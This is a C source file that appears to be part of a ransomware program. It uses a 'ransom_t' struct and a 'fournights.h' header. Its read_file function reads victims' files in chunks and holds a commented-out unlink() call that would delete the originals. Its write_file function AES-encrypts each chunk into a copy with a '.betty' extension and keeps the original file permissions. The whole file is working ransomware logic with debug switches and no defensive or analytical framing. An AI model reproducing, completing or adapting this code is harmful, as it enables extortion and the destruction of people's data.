#include "fournights.h"
/**
  * read_file - reads lines from a file, and executes a function on them.
  * @filepath: filepath to read
  * @head: head of a linked list
  * @fxn: pointer to function to enact on char buffer
  * Return: number of bytes read
 **/
size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *))
{
	size_t bytes_read = ransom->target_file_buf->bytes_read;
	off_t file_offset = ransom->target_file_buf->file_offset;
	unsigned int st_size = (unsigned int)ransom->target_file_buf->file_info.st_size;
	FILE *fd = NULL;

	if (!filepath || !ransom)
		return(0);
	if(st_size == 0)
	{
#ifndef NO_DEBUG
		fprintf(stderr, "File is empty\n");
#endif
		return(0);
	}
	if ((fd = fopen(filepath, "rb")))
		fseek(fd, file_offset, SEEK_SET);
	else
		return(0);
#ifndef NO_DEBUG
	printf("\n\n----------------------------------------------\n");
	printf("st_size: %d - file_offset: %d == %d\n", st_size, (int)ransom->target_file_buf->file_offset, st_size - (int)ransom->target_file_buf->file_offset);
	printf("bytes_read: %d\n", (int)bytes_read);
	getchar();
#endif
	if ((st_size - (int)file_offset) > BIGBUF)
		bytes_read = BIGBUF;
	else
		bytes_read = (size_t)st_size - file_offset;
	fread((char *)ransom->target_file_buf->buf, bytes_read, sizeof(char), fd);
	fclose(fd);
	/* Disabled for debugging. Will remove reference to original file
	unlink(filepath);
	*/
	/* update tmp buffer struct to use in main. Set end of bytes read to null, for printing later*/
#ifndef NO_DEBUG
	ransom->target_file_buf->buf[bytes_read] = '\0';
#endif
	ransom->target_file_buf->file_offset += bytes_read;
	ransom->target_file_buf->bytes_read = bytes_read;

	/* call external function */
	if(fxn)
		fxn(ransom->target_file_buf->buf, ransom);
	return (bytes_read);
}

/**
  * write_file - writes the contents of a buffer to a file.
  * @filepath: filepath to write
  * @buffer: buffer to write into the file
  * Return: number of bytes read
 **/
char *write_file(char *buffer, ransom_t *ransom)
{
	int buf_size = 0;
	size_t new_ext_len = 0, filepath_len = 0, bytes_written = 0;
	char *new_ext = ".betty", *filepath = NULL;
	unsigned char *encrypt_buf = NULL;
	FILE *fd = NULL;

	filepath = ransom->target_file_buf->filepath;
	filepath_len = my_strlen(filepath);
	new_ext_len = my_strlen(new_ext);
	buf_size = ransom->target_file_buf->bytes_read;

	/**
	  * If filepath has ".betty" at the end of it,
	  * the file still is bigger than 4KiB, and is getting written into.
	  * Append ".betty" to the working file. This prevents things like
	  * "file.txt.betty", "file.txt.betty.betty", "file.txt.betty.betty.betty"
	  * in the case of a 12KiB+ size file.
	  **/
	if (find_substr_end(filepath, new_ext) == 0)
		my_strncat(filepath, new_ext, filepath_len, new_ext_len);

	if ((fd = fopen(filepath, "ab+")))
		fseek(fd, ransom->target_file_buf->file_offset, SEEK_SET);
	else
		return(NULL);
	/** ENCRYPT **/
	encrypt_buf = aes_encrypt(ransom->target_file_buf->encrypt, (unsigned char *)buffer, &buf_size);
	if ((bytes_written = fwrite(encrypt_buf, buf_size, sizeof(char), fd)) < 1)
	{
#ifndef NO_DEBUG
		fprintf(stderr, "No bytes written\n");
#endif
	}
	free(encrypt_buf);
	fclose(fd);
	chmod(filepath, ransom->target_file_buf->file_info.st_mode);
	return(buffer);
}
